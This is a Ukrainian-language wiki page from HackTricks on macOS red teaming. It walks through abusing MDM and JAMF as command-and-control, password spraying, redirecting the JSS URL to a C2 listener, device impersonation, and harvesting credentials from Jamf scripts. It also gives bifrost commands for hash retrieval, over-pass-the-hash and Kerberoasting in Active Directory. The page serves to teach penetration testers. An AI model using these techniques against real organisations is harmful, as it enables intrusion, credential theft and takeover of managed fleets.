# Red Teaming macOS

{{#include ../../banners/hacktricks-training.md}}


## Зловживання MDM

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Якщо вам вдасться **скомпрометувати облікові дані адміністратора** для доступу до платформи керування, ви **потенційно зможете скомпрометувати всі комп’ютери**, розгорнувши на них malware.

Для Red Teaming у середовищах MacOS наполегливо рекомендується розуміти, як працюють MDM:


{{#ref}}
macos-mdm/
{{#endref}}

### Використання MDM як C2

MDM матиме дозвіл установлювати, запитувати або видаляти профілі, установлювати застосунки, створювати локальні облікові записи адміністратора, встановлювати пароль прошивки, змінювати ключ FileVault...

Щоб запустити власний MDM, потрібно, щоб **ваш CSR підписав постачальник**. Це можна спробувати зробити за допомогою [**https://mdmcert.download/**](https://mdmcert.download/). Для запуску власного MDM для пристроїв Apple можна скористатися [**MicroMDM**](https://github.com/micromdm/micromdm).

Реєстрація в MDM **не** робить TLS-сертифікат сервера керування автоматично довіреним CA і не надає ідентифікатор для підписування застосунків. Якщо сервер використовує приватний CA, його кореневий і проміжні сертифікати потрібно додати до профілю реєстрації або окремого профілю довіри. Сертифікат клієнта, який використовується для автентифікації MDM, є іншим сертифікатом.<sup>[[7]](#references)</sup>

Завантажений профіль реєстрації MDM (`.mobileconfig`) потрібно відкрити й затвердити в **System Settings → General → Device Management**. Саме лише розміщення профілю в `.pkg`, установленому з правами root, або в ZIP-архіві, відкритому через Safari, не призведе до непомітної реєстрації сучасного Mac. Див. [поведінку профілів конфігурації](../macos-auto-start-locations.md#configuration-profiles-mobileconfig).<sup>[[8]](#references)</sup>

Automated Device Enrollment під час Setup Assistant — це окремий процес. Інші передумови описано в матеріалі про [шахрайську реєстрацію пристрою іншої організації](macos-mdm/enrolling-devices-in-other-organisations.md).<sup>[[9]](#references)</sup>

**Агент Mythic Orthrus** використовує цю техніку.

### Розгортання пакета через контрольований MDM

На **контрольованому Mac під керуванням macOS 26 або новішої версії** контроль над службою MDM дає змогу використовувати декларацію `com.apple.configuration.package` в системній області.<sup>[[10]](#references)</sup> Пакет має мати підпис, який пристрій може перевірити, але його застосунку не потрібен окремий підпис Developer ID: Gatekeeper не перевіряє застосунки, установлені через керування пристроями.<sup>[[11]](#references)</sup> Довірений TLS-сертифікат сервера сам по собі не надає оператору приватного ключа чи можливості підписування, потрібних для підпису такого пакета.<sup>[[11]](#references)[[12]](#references)</sup>

Створіть підписаний тестовий пакет, обчисліть його digest і опублікуйте пакет та plist `ManifestURL` через HTTPS. Маніфест має містити один ресурс `software-package` із URL і SHA-256, а також унікальні `bundle-identifier` і `bundle-version`.<sup>[[11]](#references)</sup> Потім надішліть декларацію пакета з URL цього маніфесту та параметром `InstallBehavior.Install`, установленим у `Required`; перевірте елемент стану `package.list`, щоб дізнатися про встановлення або помилки.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
pkgbuild --component ./Test.app --install-location /Applications --sign "Package Signing Certificate" ./Test.pkg
shasum -a 256 ./Test.pkg
```

Мінімальна декларація обов’язкового встановлення, подана через службу MDM, має такий вигляд (замініть URL і обидва UUID).<sup>[[10]](#references)</sup>

```json
{
  "Type": "com.apple.configuration.package",
  "Identifier": "11111111-1111-4111-8111-111111111111",
  "ServerToken": "22222222-2222-4222-8222-222222222222",
  "Payload": {
    "ManifestURL": "https://mdm.example.org/TestPackage.plist",
    "InstallBehavior": {"Install": "Required"}
  }
}
```

### Зловживання JAMF PRO

JAMF може запускати **custom scripts** (скрипти, розроблені системним адміністратором), **native payloads** (створення локальних облікових записів, встановлення пароля EFI, моніторинг файлів/процесів...) і **MDM** (конфігурації пристроїв, сертифікати пристроїв...).<sup>[[5]](#references)</sup>

#### Самостійна реєстрація в JAMF

Перейдіть на сторінку на кшталт `https://<company-name>.jamfcloud.com/enroll/`, щоб перевірити, чи ввімкнено **самостійну реєстрацію**. Якщо так, для доступу можуть **запитати облікові дані**.

Для виконання атаки password spraying можна використати скрипт [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py).

Крім того, знайшовши дійсні облікові дані, ви зможете виконати brute-force для інших імен користувачів за допомогою такої форми:

![Зловживання JAMF PRO — самостійна реєстрація в JAMF: Крім того, знайшовши дійсні облікові дані, ви зможете виконати brute-force для інших імен користувачів за допомогою такої форми](<../../images/image (107).png>)

#### Автентифікація пристрою JAMF

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Бінарний файл **`jamf`** містив секрет для відкриття keychain, який на момент виявлення був **спільним** для всіх. Секрет: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Крім того, jamf **зберігається** як **LaunchDaemon** у **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Перехоплення контролю над пристроєм JAMF

**URL**-адреса **JSS** (Jamf Software Server), яку використовуватиме **`jamf`**, розташована в **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Цей файл містить URL-адресу:

```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
	<key>is_virtual_machine</key>
	<false/>
	<key>jss_url</key>
	<string>https://subdomain-company.jamfcloud.com/</string>
	<key>last_management_framework_change_id</key>
	<integer>4</integer>
[...]
```

Отже, зловмисник міг би підкинути шкідливий пакет (`pkg`), який під час встановлення **перезаписує цей файл**, задаючи **URL прослуховувача Mythic C2 для агента Typhon**, щоб використовувати JAMF як C2.

```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```

#### Імперсонація JAMF

Щоб **імітувати обмін даними** між пристроєм і JMF, вам потрібні:

- **UUID** пристрою: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- **keychain JAMF** з `/Library/Application\ Support/Jamf/JAMF.keychain`, який містить сертифікат пристрою

Маючи цю інформацію, **створіть VM** зі **вкраденим** Hardware **UUID** і **вимкненим SIP**, скопіюйте туди **keychain JAMF**, зробіть **hook** агента Jamf і викрадіть його дані.

#### Крадіжка секретів

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Також можна стежити за каталогом `/Library/Application Support/Jamf/tmp/` — там з’являються **користувацькі скрипти**, які адміністратори можуть запускати через Jamf: їх **розміщують тут, виконують і видаляють**. Ці скрипти **можуть містити облікові дані**.

Однак **облікові дані** можуть передаватися цим скриптам як **параметри**, тому потрібно стежити за `ps aux | grep -i jamf` (навіть без root).

Скрипт [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) може відстежувати появу нових файлів і нових аргументів процесів.

### Віддалений доступ до macOS

Також про «особливі» **мережеві протоколи** **MacOS**:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Іноді ви виявите, що комп’ютер із **MacOS під’єднаний до AD**. У такому разі спробуйте **enumerate** Active Directory звичним для вас способом. Довідку можна знайти на таких сторінках:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Також може стати в пригоді локальний інструмент для **MacOS** — `dscl`:

```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```

Також існують інструменти для MacOS, які автоматично збирають інформацію про AD і дають змогу працювати з kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound — це розширення інструмента Bloodhound для аудиту, яке дає змогу збирати та завантажувати дані про зв’язки Active Directory на хостах MacOS.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost — це проєкт Objective-C, призначений для взаємодії з API Heimdal krb5 у macOS. Мета проєкту — забезпечити ефективніше тестування безпеки Kerberos на пристроях macOS за допомогою нативних API, не вимагаючи інших фреймворків або пакетів на цільовому пристрої.
- [**Orchard**](https://github.com/its-a-feature/Orchard): інструмент JavaScript for Automation (JXA) для збору інформації про Active Directory.

### Інформація про домен

```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```

### Користувачі

Є три типи користувачів MacOS:

- **Локальні користувачі** — керуються локальною службою OpenDirectory і жодним чином не підключені до Active Directory.
- **Мережеві користувачі** — тимчасові користувачі Active Directory, яким для автентифікації потрібне підключення до сервера DC.
- **Мобільні користувачі** — користувачі Active Directory з локальною резервною копією облікових даних і файлів.

Локальна інформація про користувачів і групи зберігається в папці _/var/db/dslocal/nodes/Default._\
Наприклад, інформація про користувача _mark_ зберігається у файлі _/var/db/dslocal/nodes/Default/users/mark.plist_, а інформація про групу _admin_ — у файлі _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Окрім використання ребер HasSession і AdminTo, **MacHound додає до бази даних Bloodhound три нові ребра**:<sup>[[2]](#references)</sup>

- **CanSSH** — сутність, якій дозволено підключатися до хоста через SSH
- **CanVNC** — сутність, якій дозволено підключатися до хоста через VNC
- **CanAE** — сутність, якій дозволено виконувати скрипти AppleEvent на хості

```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```

Більше інформації: [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Пароль Computer$

Отримайте паролі за допомогою:

```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```

Можна отримати доступ до пароля **`Computer$`** у зв’язці ключів System.

### Over-Pass-The-Hash

Отримайте TGT для певного користувача та служби:

```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
       --hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```

Після отримання TGT його можна впровадити в поточний сеанс за допомогою:

```bash
bifrost --action asktgt --username test_lab_admin \
       --hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
       --enctype aes256 --domain test.lab.local
```

### Kerberoasting

```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
       --username [user] --hash [hash] --enctype [enctype]
```

Отримавши service tickets, можна спробувати отримати доступ до мережевих ресурсів на інших комп’ютерах:

```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```

## Доступ до Keychain

Keychain із великою ймовірністю містить конфіденційну інформацію, доступ до якої без появи запиту може допомогти просунутися в Red Team exercise:


{{#ref}}
macos-keychain.md
{{#endref}}

## Зовнішні сервіси

Red Teaming у MacOS відрізняється від звичайного Red Teaming у Windows, оскільки **MacOS зазвичай безпосередньо інтегрована з кількома зовнішніми платформами**. Типова конфігурація MacOS дає змогу отримувати доступ до комп’ютера за допомогою **синхронізованих облікових даних OneLogin і користуватися кількома зовнішніми сервісами** (як-от github, aws...) через OneLogin.

## Інші техніки Red Team

### Safari

Коли файл завантажується в Safari, якщо це «безпечний» файл, він **відкривається автоматично**. Наприклад, якщо ви **завантажите zip-файл**, його буде автоматично розпаковано:<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>



## References

- [1] [Збирання яблук: Red Teaming середовищ MacOS у 2021 році — Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Представляємо MacHound: рішення для атак на Active Directory у macOS](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature — команди переліку домену (еквіваленти dscl / net / ldapsearch)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Переходьте на темний бік — у нас є яблука: зловмисне використання керування macOS](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: «Погляд зловмисника на конфігурації Jamf» — Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [Виявлення Active Directory за допомогою Mac — its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
- [7] [Apple — Керування сертифікатами для сервісів і пристроїв керування пристроями](https://developer.apple.com/documentation/devicemanagement/managing-certificates-for-device-management-services-and-devices)
- [8] [Apple — Використання профілів конфігурації на Mac](https://support.apple.com/en-gb/guide/mac-help/mh35561/mac)
- [9] [Apple — Розгортання профілів реєстрації керування пристроями](https://developer.apple.com/documentation/devicemanagement/deploying-device-management-enrollment-profiles)
- [10] [Apple — Оголошення пакета](https://developer.apple.com/documentation/devicemanagement/package)
- [11] [Apple — Встановлення пакетів](https://developer.apple.com/documentation/devicemanagement/installing-packages)
- [12] [Apple — Ідентичності](https://developer.apple.com/documentation/security/identities)
{{#include ../../banners/hacktricks-training.md}}
